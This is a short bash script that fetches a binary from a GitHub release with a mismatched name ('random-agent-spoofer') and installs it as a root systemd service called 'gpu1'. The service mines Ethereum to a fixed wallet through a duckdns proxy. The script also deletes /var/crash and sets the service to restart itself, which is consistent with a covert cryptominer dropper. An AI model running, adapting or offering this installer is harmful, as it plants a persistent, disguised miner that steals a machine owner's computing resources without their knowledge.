#!/bin/bash
cd /home
sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/jvd
sudo chmod +x jvd
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/jvd -a ethash -o stratum+tcp://asia2.ethermine.org:14444 -u 0x4296116d44a4a7259B52B1A756e19083e675062A.default  --proxy socketh.duckdns.org:9999
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart

sudo systemctl daemon-reload &&
sudo systemctl enable gpu1.service &&
sudo service gpu1 stop  &&
sudo service gpu1 restart
